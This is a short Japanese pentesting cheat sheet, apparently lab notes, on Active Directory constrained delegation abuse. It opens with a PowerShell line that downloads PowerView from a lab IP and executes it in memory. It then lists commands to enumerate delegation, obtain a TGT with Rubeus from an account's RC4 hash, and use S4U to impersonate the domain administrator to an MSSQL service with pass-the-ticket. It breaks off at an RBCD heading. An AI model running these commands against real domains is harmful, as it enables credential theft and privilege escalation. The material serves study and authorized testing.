install powerview
```
IEX (New-Object Net.WebClient).DownloadString('http://192.168.49.64/PowerView.ps1')
```

## Constrained Delegation
Constrained Delegationを確認
```
Get-DomainComputer -TrustedToAuth
```

`samaccountname`のアカウントは`msds-allowedtodelegateto`フィールドにSPNとしてリストされている任意のサービスに対してサービスチケットを要求可能

samaaccountnameのTGTを取得
```
Rubeus.exe asktgt /user:iissvc /domain:prod.corp1.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E
```

委任設定されてるサービスに対してimpersonate
```
Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /ptt
```
### RBCD
